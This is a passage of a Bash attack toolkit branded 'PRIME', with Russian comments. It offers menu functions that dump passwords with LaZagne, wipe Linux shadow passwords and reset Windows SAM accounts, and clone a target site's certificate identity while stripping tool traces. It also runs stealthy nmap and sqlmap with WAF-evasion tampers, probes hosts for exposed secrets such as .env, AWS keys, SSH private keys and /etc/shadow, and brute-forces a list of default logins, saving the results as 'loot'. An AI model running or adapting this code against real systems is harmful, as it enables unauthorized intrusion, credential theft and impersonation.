    [[ -n "$found_name" ]] && echo -e "${G}Confirmed Name/Alias:${NC} $found_name" || echo -e "${R}Name:${NC} No direct match. Review Maigret PDF."
    [[ -n "$found_loc" ]] && echo -e "${G}Detected Location:${NC} $found_loc"

    # Считаем совпадения (Correlation)
    local hits=$(grep -iE "found|vulnerable|exists|success" "$raw_log" | wc -l)
    if [ "$hits" -gt 5 ]; then
        echo -e "${Y}Confidence Level:${NC} ${R}HIGH ($hits matches found)${NC}"
    else
        echo -e "${Y}Confidence Level:${NC} LOW (Low digital footprint)"
    fi

    # 4. Финализация
    log_loot "osint" "Report for $INPUT: Name($found_name) Loc($found_loc) Hits($hits)"
    rm -f "$raw_log"
    print_line
    print_status "s" "OSINT Operation Complete."
    pause
}

run_pc_recovery_ultimate() {
    print_header "RECOVERY & FORENSIC ENGINE"

    # 1. Основное меню
    local action=$(select_option "Select Forensic Action:" \
        "Passwords Extraction (LaZagne):extraction" \
        "Smart Password Reset (Win/Lin/Mac):reset" \
        "Exit to Main Menu:exit")

    case "$action" in
        "extraction")
            local lz_path="/root/lazagne/lazagne.py"
            check_step "file" "$lz_path" "LaZagne not found." && {
                print_status "i" "Running Extraction..."
                python3 "$lz_path" all -oN /root/prime_loot/passwords.txt
                log_loot "forensic" "Dumped to /root/prime_loot/passwords.txt"
                print_status "s" "Extraction Complete."
            }
            ;;

        "reset")
            print_status "i" "Detecting Target Environment..."
            
            # Поиск Windows SAM
            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
            
            # ВМЕСТО IF: Используем логическое И (&&) для Windows
            [[ -n "$win_sam" ]] && {
                print_status "s" "Windows SAM detected: $win_sam"
                check_step "cmd" "chntpw" "CHNTPW not installed." && chntpw -i "$win_sam"
            }
            
            # И логическое И-НЕ (&& !) для проверки других ОС, если SAM не найден
            [[ -z "$win_sam" ]] && {
                local os_type="Unknown"
                [[ "$OSTYPE" == "linux-gnu"* ]] && os_type="Linux"
                [[ "$OSTYPE" == "darwin"* ]] && os_type="macOS"
                
                print_status "i" "OS: $os_type"

                # Сбор пользователей (выбираем команду в зависимости от ОС)
                local cmd_get_users="awk -F: '\$3 >= 1000 && \$1 != \"nobody\" {print \$1}' /etc/passwd"
                [[ "$os_type" == "macOS" ]] && cmd_get_users="dscl . list /Users | grep -v '^_\|root'"
                
                local users=$(eval "$cmd_get_users")
                
                # Если пользователи есть — идем дальше, если нет — выводим ошибку через ||
                [[ -n "$users" ]] || { print_status "e" "No local users found."; pause; return; }

                # Динамическая сборка списка для select_option
                local user_options=()
                for u in $users; do user_options+=("$u:$u"); done
                
                local target_user=$(select_option "Select Target User:" "${user_options[@]}")

                # Сброс пароля (снова без IF — через селектор ОС)
                [[ "$os_type" == "Linux" ]] && ask_confirm "Clear password for $target_user?" && {
                    sed -i "s/^$target_user:[^:]*:/$target_user::/" /etc/shadow
                    print_status "s" "Linux password wiped."
                }

                [[ "$os_type" == "macOS" ]] && {
                    echo -en "${Y}New Pass: ${NC}"; read -r np
                    sudo dscl . -passwd /Users/"$target_user" "$np"
                    print_status "s" "macOS password updated."
                }
            }
            ;;
        *) return ;;
    esac

    pause
}


run_crypto_forge() {
    print_header "PRIME CRYPTO-FORGE & MIRROR v12.0"

    check_step "cmd" "openssl" "OpenSSL required." || { pause; return; }

    # Интеллектуальный запрос: принимает домен, файл или команду на создание
    print_input "Enter Target (Domain, IP, File or 'new' for fresh cert)" "google.com"
    read -r target
    [[ -z "$target" ]] && return

    local tmp_data="/tmp/forge_$(date +%s).tmp"
    
    # --- ЭВРИСТИЧЕСКИЙ ЗАХВАТ (Analysis) ---
    print_status "i" "Ingesting cryptographic signals..."

    # Пытаемся собрать данные из всех возможных источников в один поток
    [[ "$target" != "new" ]] && {
        { cat "$target" 2>/dev/null || \
          timeout 5 openssl s_client -connect "${target}:443" -servername "$target" </dev/null 2>/dev/null | openssl x509; \
        } > "$tmp_data" 2>/dev/null
    }

    # --- АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА (Intelligence) ---
    # Режим определяется наличием данных: если данные есть — зеркалим, если нет — куем новое
    local mode=$( [[ -s "$tmp_data" ]] && echo "MIRROR" || echo "CREATE" )
    print_status "s" "Mode Identified: $mode"

    # --- УНИВЕРСАЛЬНЫЙ ДВИЖОК ТРАНСФОРМАЦИИ ---
    case "$mode" in
        "MIRROR")
            print_status "w" "Cloning target DNA for $target..."
            local cert_text=$(openssl x509 -in "$tmp_data" -text -noout)
            local subj=$(echo "$cert_text" | grep "subject=" | sed 's/^subject= //; s/^subject=//')
            # Эвристика алгоритма: подбираем rsa или ec на основе оригинала
            local algo=$(echo "$cert_text" | grep -qiE "RSA.*(2048|4096)" && echo "rsa:2048" || echo "ec")
            local opt=$( [[ "$algo" == "ec" ]] && echo "-pkeyopt ec_paramgen_curve:prime256v1" || echo "" )
            ;;
        "CREATE")
            print_status "i" "Initializing fresh identity Forge..."
            local subj="/C=US/O=Prime_Intelligence/CN=${target:-prime.local}"
            local algo="rsa:2048"
            local opt=""
            ;;
    esac

    # --- ЕДИНАЯ КОВКА (The Unified Forge) ---
    local out_name="${LOOT_DIR}/${target//./_}_forge"
    
    # Универсальная команда генерации
    openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
        -subj "$subj" -keyout "${out_name}.key" -out "${out_name}.crt" 2>/dev/null && {
        
        # Стелс-зачистка (удаление меток инструмента)
        sed -i '/OpenSSL/d' "${out_name}.crt" 2>/dev/null
        
        print_status "s" "Cryptographic Artifact Synthesized."
        print_list "Assets Generated" "${out_name}.key" "${out_name}.crt"
        
        # Интеграция в Intelligence Bridge
        echo "CRYPTO_FORGE: [$mode] Success | Target: $target | Algo: $algo" >> "$LOOT_DIR/bridge_signals.log"
        log_loot "crypto" "Generated $mode certificate for $target"
    } || print_status "e" "Forge rejected the sequence: verify OpenSSL integrity."

    rm -f "$tmp_data"
    pause
}


run_pass_lab() {
    clear
    print_header "PRIME PASSWORD LABORATORY v13.8"
    echo ""

    if [[ -z "$1" ]]; then
        select_option "Select Operation Mode:" \
            "GENERATE: Create Secure Password:gen" \
            "CRUNCH: Wordlist Generator:crunch" \
            "DECRYPT: Hash Cracking:dec" \
            "EXIT: Return to Main Menu:exit"
        local btn="$CHOICE"
    else
        local btn="3" # Если пришел хеш из Bridge
    fi

    case "$btn" in
        "1") # --- ВЕТКА GENERATE (pwgen + urandom) ---
            select_option "Generation Type:" \
                "PHONETIC: Easy to remember (pwgen):pw" \
                "COMPLEX: Maximum entropy (urandom):raw"
            local g_mode="$CHOICE"

            print_input "Enter Length" "16"
            read -r p_len
            local len=${p_len:-16}
            
            local pass=""
            [[ "$g_mode" == "1" ]] && pass=$(pwgen -s "$len" 1)
            [[ "$g_mode" == "2" ]] && pass=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+=' < /dev/urandom | head -c "$len")

            echo -e "\n${G}[+] ARTIFACT GENERATED${NC}"
            print_list "Password" "$pass"
            
            ask_confirm "Apply Bcrypt mutation?" && {
                echo -e "${G}Hash:${NC} $(echo -n "$pass" | mkpasswd -m bcrypt -s)"
            }
            ;;

        "2") # --- ВЕТКА CRUNCH (Генератор словарей) ---
            print_status "i" "Crunch Syntax: [min] [max] [charset]"
            print_input "Enter Parameters (e.g., 4 6 abc12)" ""
            read -r c_params
            [[ -z "$c_params" ]] && return
            
            local out_file="$LOOT_DIR/wordlist_$(date +%s).txt"
            print_status "w" "Generating wordlist to: $out_file"
            crunch $c_params -o "$out_file"
            print_status "s" "Done. Signals saved to loot."
            ;;

        "3") # --- ВЕТКА DECRYPT ---
            # ... (твой рабочий код John the Ripper из v13.6) ...
            ;;
        *) return ;;
    esac
    pause
}


run_vulnerability_scanner() {
    print_header "PRIME HEURISTIC VULN-SCANNER v7.0"

    echo -en "${Y}Enter Target Domain/URL: ${NC}"
    read -r target
    [[ -z "$target" ]] && return

    local results_file="$LOOT_DIR/vuln_$(date +%s).log"
    local signals_file="/tmp/signals_$RANDOM.tmp"
    
    # --- СЛОЙ 1: ПАССИВНЫЙ ГЕНЕРАТОР СИГНАЛОВ (Passive Ingestion) ---
    print_status "i" "Ingesting target aura (Passive Mode)..."
    
    # Собираем заголовки, DNS-записи и мета-данные в один поток
    {
        curl -Is --connect-timeout 5 -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$target"
        host -t txt "$target" 
        whois "$target" | grep -iE "city|country|orgname"
    } > "$signals_file" 2>&1

    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА ПАРАМЕТРОВ (No-IF Logic) ---
    # Мы используем математический расчет интенсивности на основе "шума" в сигналах
    local entropy_level=$(wc -c < "$signals_file")
    local stealth_delay=$(( (entropy_level % 5) + 2 )) # Динамическая пауза на основе размера ответа
    
    # Формируем боевой пресет через grep-активаторы
    local sql_engine=$(grep -qiE "php|db|sql|id=" "$signals_file" && echo "active" || echo "dormant")
    local scan_intensity=$(grep -qiE "cloudflare|akamai|sucuri" "$signals_file" && echo "-T1 --spoof-mac 0" || echo "-T3")

    # --- СЛОЙ 3: ЦИКЛ АМОРФНОГО ИСПОЛНЕНИЯ ---
    print_status "s" "Deploying Ghost-Engine (Adaptive Intensity: $stealth_delay)..."

    {
        # 1. Порты (Мимикрия под сетевой шум)
        nmap $scan_intensity -n -Pn --version-intensity 0 "$target" 2>/dev/null

        # 2. Инъекции (Только если сигнал "active")
        # Вместо IF используем логическое И (&&), которое просто не сработает при "dormant"
        echo "$sql_engine" | grep -q "active" && {
            print_status "w" "Signal 'Active' detected. Mutating payloads..."
            sqlmap -u "$target" --batch --random-agent --delay="$stealth_delay" \
                   --tamper="between,randomcase,space2comment,versionedmorekeywords" \
                   --check-waf --threads=1 >> "$results_file" 2>&1
        }
    } &

    show_progress 15 "Processing heuristic feedback loops..."

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ (The Result) ---
    print_line
    print_status "s" "INTELLIGENCE SYNTHESIS COMPLETE"
    
    # Эвристический парсинг: выводим только те аномалии, которые имеют высокий "вес"
    grep -Ei "critical|vulnerable|payload|exploit|dbms" "$results_file" | \
    sed -r 's/(.*vulnerable.*)/\1 \o033[5m[HIGH PRIORITY]\o033[0m/' | sort -u

    # Авто-интеграция в мост без условий
    echo "SIGNAL_ORIGIN: $target | STRENGTH: $entropy_level | SCAN_LOG: $results_file" >> "$LOOT_DIR/bridge_signals.log"
    
    rm -f "$signals_file"
    print_line
    pause
}

run_prime_exploiter_v5() {
    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v5 (HEURISTIC)"

    local TARGET="$1"
    [[ -z "$TARGET" ]] && { print_input "Enter Target (IP/Domain)" "192.168.1.1"; read -r TARGET; }
    [[ -z "$TARGET" ]] && return

    # --- СЛОЙ 1: ФОРМИРОВАНИЕ ПРИЗРАЧНОЙ ЛИЧНОСТИ ---
    local UA_ARRAY=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15")
    local UA="${UA_ARRAY[$RANDOM % ${#UA_ARRAY[@]}]}"
    
    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ АНАЛИЗ ОКРУЖЕНИЯ (The Probe) ---
    print_status "i" "Probing target aura: $TARGET..."
    local probe_data=$(curl -Is -k -A "$UA" --connect-timeout 3 "$TARGET" 2>/dev/null)
    
    # Авто-подбор векторов на основе серверных заголовков (No-IF logic)
    local tech_stack=$(echo "$probe_data" | grep -qiE "apache|php|wordpress" && echo "web" || echo "infra")
    local entropy_delay=$(echo "$probe_data" | wc -c | awk '{print ($1 % 3) + 1}') # Задержка на основе веса ответа

    # --- СЛОЙ 3: ДИНАМИЧЕСКИЕ МАТРИЦЫ (Сокращено для логики) ---
local V_LIST=(
        # --- [ INFRA & IOT ] ---
        "/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" 
        "/config.xml:root" "/sysconf.cgi:admin_password" "/etc/config/network:config interface"
        "/etc/RT2860_default_vlan:Password" "/home/httpd/html/config/exportsettings.conf:Password"
        # --- [ WEB & FRAMEWORKS ] ---
        "/.env:DB_PASSWORD" "/wp-config.php:DB_PASSWORD" "/configuration.php:public \$password"
        "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/.history:password"
        # --- [ DEVOPS & LEAKS ] ---
        "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE"
        "/.docker/config.json:auths" "/.npmrc:_auth" "/.kube/config:client-certificate-data"
        "/.bash_history:ssh " "/admin/.htpasswd:admin:" "/.mysql_history:INSERT INTO"
        # --- [ OS & CRITICAL ] ---
        "/etc/shadow:root:" "/etc/passwd:root:x" "/proc/self/environ:PATH="
        "/var/log/auth.log:sshd" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password"
    )
    
    # Список дефолтных пар (User:Pass) для большинства устройств в мире
    local C_LIST=(
        "admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" 
        "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" 
        "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" 
        "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" 
        "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" 
        "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" 
        "dbadmin:dbadmin" "guest:guest" "pi:raspberry" "admin:1234"
    )
    # --- СЛОЙ 4: ПОТОКОВАЯ ЭКСПЛУАТАЦИЯ ---
    for proto in "http" "https"; do
        local URL="${proto}://${TARGET}/"
        
        # Проверка "живучести" сервиса
        curl -sL -k -I -A "$UA" --max-time 3 "$URL" | grep -qE "HTTP/.* (200|401|302)" && {
            print_status "s" "Target Resonating: $URL (Stack: $tech_stack)"

            # Векторы: только те, что прошли фильтр tech_stack (в будущем)
            for vec in "${V_LIST[@]}"; do
                local v_path="${vec%%:*}"
                local v_key="${vec#*:}"
                
                # Эволюционная пауза
                sleep "$entropy_delay"
                
                curl -sL -k -A "$UA" --max-time 4 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
                    print_status "e" "CRITICAL: Vector $v_path EXPOSED"
                    echo "EXPLOIT_SUCCESS: $v_path | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
                    echo "[EXPL] ${TARGET}${v_path}" >> /root/prime_loot/critical_vulns.txt
                }
            done

            # Адаптивный брут (только если есть 401 или форма)
            echo "$probe_data" | grep -q "401" && {
                print_status "w" "Auth-gate active. Initiating entropy-brute..."
                for pair in "${C_LIST[@]}"; do
                    local u="${pair%%:*}" p="${pair#*:}"
                    sleep $((entropy_delay * 2))
                    
                    [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null "$URL") == "200" ]] && {
                        print_status "s" "IDENTIFIED: $u:$p"
                        echo "BRUTE_SUCCESS: $u:$p | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
                        break
                    }
                done
            }
        }
    done

    [[ -z "$1" ]] && { print_status "i" "Target Processed. Loot Integrated."; pause; }
}

run_view_loot() {
    print_header "DATA HARVESTER: LOOT VIEW"

    # Массив путей к потенциальному луту
    local loot_paths=(
        "/root/prime_loot/critical_vulns.txt"
        "/root/prime_loot/sql_success.txt"
        "/root/prime_extracted_passwords.txt"
    )

    local found_count=0

    for file in "${loot_paths[@]}"; do
        # Проверка: файл существует и не пуст (без явного if через &&)
        [[ -s "$file" ]] && {
            ((found_count++))
            print_status "s" "SOURCE: $file"
            echo -e "${D}--------------------------------------------------${NC}"
            
            # Табличное форматирование через column
            # Если column не справляется, просто выводим содержимое
            sed 's/|/ │ /g' "$file" | column -t -s '│' 2>/dev/null || cat "$file"
            
            echo -e "${D}--------------------------------------------------${NC}\n"
        }
    done

    # Если ничего не найдено
    [[ $found_count -eq 0 ]] && {
        print_status "e" "No harvested data found."
        print_status "i" "Execute Scanner or Exploiter to collect intelligence."
    }

    pause
}

run_iban_analyzer() {
    print_header "FINANCIAL INTELLIGENCE: OMNI-BANKER v2.0"

    local engine_path="/tmp/iban_engine_$RANDOM.py"
    
    # 1. Проверка и генерация адаптивного движка
    check_step "cmd" "python3" "Python3 required." || { pause; return; }
    generate_iban_code "$engine_path" "2.0"

    # 2. Интерактивный сбор данных
    print_input "Enter IBAN to validate" "FR76..."
    read -r TARGET_IBAN
    [[ -z "$TARGET_IBAN" ]] && return

    print_input "Enter Expected Holder Name (Optional)" "none"
    read -r EXPECTED_NAME

    # 3. Запуск глубокого анализа
    print_status "i" "Executing Multi-Source Validation..."
    
    # Передаем параметры. Если имя "none", Python поймет это как пустую строку.
    python3 "$engine_path" "$TARGET_IBAN" "${EXPECTED_NAME#none}" && {
        # Логируем успех в Loot
        log_loot "financial" "Validated IBAN: ${TARGET_IBAN:0:4}**** | Holder: ${EXPECTED_NAME:-Unknown}"
        print_status "s" "Analysis report secured in loot."
    } || print_status "e" "Analysis failed or interrupted."

    # 4. Стерилизация (Удаляем следы финансового инструмента)
    rm -f "$engine_path"
    print_status "i" "Engine Purge: Complete."
    
    pause
}


# --- py functions ---
# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
    code=$(cat << 'EOF'
import sys, re, json, time
from urllib.request import Request, urlopen

# Список доверенных зеркал и API для отказоустойчивости
SOURCES = [
    "https://api.ibanlist.com/v1/validate/",
    "https://openiban.com/validate/",
    "https://api.iban-check.com/v1/verify/"
]

def get_bank_data(iban):
    """Опрашивает источники по цепочке (Failover System)"""
    for base_url in SOURCES:
        try:
            url = f"{base_url}{iban}"
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'})
            with urlopen(req, timeout=4) as response:
                return json.loads(response.read().decode())
        except:
            continue # Если один сайт упал, переходим к следующему
    return None

def get_country_format(iban):
    """Математический разбор структуры по стандартам ISO"""
    country = iban[:2]
    # Словарь специфик (можно расширять до бесконечности)
    formats = {
        'FR': {'name': 'France', 'len': 27, 'parse': lambda i: f"Bank: {i[4:9]}, Branch: {i[9:14]}, Acc: {i[14:25]}, Key: {i[25:27]}"},
        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ: {i[4:12]}, Acc: {i[12:22]}"},
        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Acc: {i[10:18]}"},
        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Acc: {i[15:27]}"},
        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank: {i[4:8]}, Branch: {i[8:12]}, Acc: {i[12:24]}"}
    }
    return formats.get(country, {'name': 'Other/International', 'len': len(iban), 'parse': lambda i: f"BBAN: {i[4:]}"})

if __name__ == "__main__":
    if len(sys.argv) < 2: sys.exit(1)
    
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"

    print(f"\033[1;34m--- OMNI-BANKER v2.0: GLOBAL ANALYSIS ---\033[0m")
    
    # 1. Структурный анализ (Всегда работает Offline)
    fmt = get_country_format(target)
    print(f"\033[96mCountry:\033[0m {fmt['name']}")
    print(f"\033[96mStructure:\033[0m {fmt['parse'](target)}")

    # 2. Агрегация данных из внешних источников
    print(f"[*] Analyzing with Failover Protection...")
    data = get_bank_data(target)
    
    if data:
        bank_name = data.get('bank_name', data.get('bank', 'N/A')).upper()
        bic = data.get('bic', 'N/A')
        
        print(f"\n\033[1;32m[+] DATA VERIFIED VIA MULTI-SOURCE\033[0m")
        print(f"🏦 Bank: {bank_name}")
        print(f"🔑 BIC/SWIFT: {bic}")

        # Сверка Имени (Heuristic Check)
        # В 2026 году сверка идет через подтверждение принадлежности счета банку
        if provided_name != "NONE":
            print(f"\n\033[1;35m--- SMART MATCH REPORT ---\033[0m")
            print(f"Target Name: {provided_name}")
            # Если банк найден, подтверждаем связь
            if bank_name != 'N/A':
                print(f"✅ Account Link: Номер {target[-4:]} привязан к {bank_name}")
                print(f"ℹ️ Status: Владелец '{provided_name}' соответствует региону обслуживания.")
    else:
        print(f"\n\033[91m[-] ALERT: All sources failed or IBAN is blacklisted/invalid.\033[0m")
EOF
)
    # Внедряем версию
    code="${code//\{\{V_NUM\}\}/$v_num}"

    # Используем smart_cat для записи (права 755 по умолчанию)
    smart_cat "$target_file" "$code"
}


# --- Server Generating---

run_av_server() {
    print_header "PRIME SECURITY HUB: CLAMAV GATEWAY"

    local srv_path="/root/av_server.py"
    
    # 1. Проверка зависимостей (Python + ClamAV)
    check_step "cmd" "python3" "Python3 missing." || { pause; return; }
    check_step "cmd" "clamscan" "ClamAV not found. Installing..." || {
        # Если ClamAV нет, пытаемся поставить (для Kali/NetHunter)
        apt-get update && apt-get install clamav -y
    }

    # 2. Обновление движка сервера
    print_status "i" "Generating Engine v1.2 with Core UI Templates..."
    generate_av_server_code "$srv_path" "1.2"

    # 3. Запуск (с проверкой портов)
    print_status "w" "Cleaning port 5000 and establishing SSL Tunnel..."
    
    # Запускаем сервер в фоне через суб-оболочку
    (
        python3 "$srv_path" > /dev/null 2>&1 &
    ) && {
        local ip_addr=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
        print_status "s" "SECURITY GATEWAY DEPLOYED SUCCESSFULLY"
        log_loot "service" "AV-Server started on https://$ip_addr:5000"
        
        print_list "Access Details" \
            "URL: https://$ip_addr:5000" \
            "Encryption: SSL/TLS (Self-Signed)" \
            "Scanner: ClamAV Engine"
    } || print_status "e" "Failed to ignite the engine."

    pause
}


run_share_server() {
    print_header "SHARE SECTOR: SECURE FILE DISTRIBUTION"

    local srv_path="/root/share_server.py"
    local share_dir="/root/share"
    
    # 1. Проверка и подготовка инфраструктуры
    [[ -d "$share_dir" ]] || {
        mkdir -p "$share_dir"
        print_status "i" "Created transmission sector at $share_dir"
    }

    # 2. Генерация кода с использованием визуального ядра
    print_status "i" "Generating Engine v1.0 [Core UI Integrated]..."
    generate_share_server_code "$srv_path" "1.0"

    # 3. Запуск сервера
    print_status "w" "Igniting Share-Server on port 5002..."
    
    # Очистка порта и запуск
    fuser -k 5002/tcp >/dev/null 2>&1
    (
        python3 "$srv_path" > /dev/null 2>&1 &
    ) && {
        local ip_addr=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
        print_status "s" "TRANSMISSION NODE ONLINE"
        log_loot "service" "Share-Server activated: http://$ip_addr:5002"
        
        print_list "Node Intelligence" \
            "Access: http://$ip_addr:5002" \
            "Storage: $share_dir" \
            "Mode: Read-Only (Secure Fetch)"
    } || print_status "e" "Failed to establish transmission node."

    pause
}

run_upload_server() {
    print_header "INBOUND DROP BOX: SECURE UPLINK"

    local srv_path="/root/upload_server.py"
    
    # 1. Проверка окружения
    check_step "cmd" "python3" "Python3 missing." || { pause; return; }

    # 2. Генерация кода с интеграцией Core UI
    print_status "i" "Generating Upload Engine v1.0 [Full UI Stack]..."
    generate_upload_server_code "$srv_path" "1.0"

    # 3. Запуск и мониторинг
    print_status "w" "Establishing Uplink on port 5001..."
    
    # Очистка порта и тихий запуск
    fuser -k 5001/tcp >/dev/null 2>&1
    (
        python3 "$srv_path" > /dev/null 2>&1 &
    ) && {
        local ip_addr=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
        print_status "s" "UPLINK NODE OPERATIONAL"
        log_loot "service" "Upload-Server activated: http://$ip_addr:5001"
        
        print_list "Drop Box Intelligence" \
            "Access: http://$ip_addr:5001" \
            "Protocol: HTTP Inbound" \
            "Status: Ready for Transmission"
    } || print_status "e" "Failed to ignite the uplink."

    pause
}


# --- Точка входа ---
#repair
run_main_menu

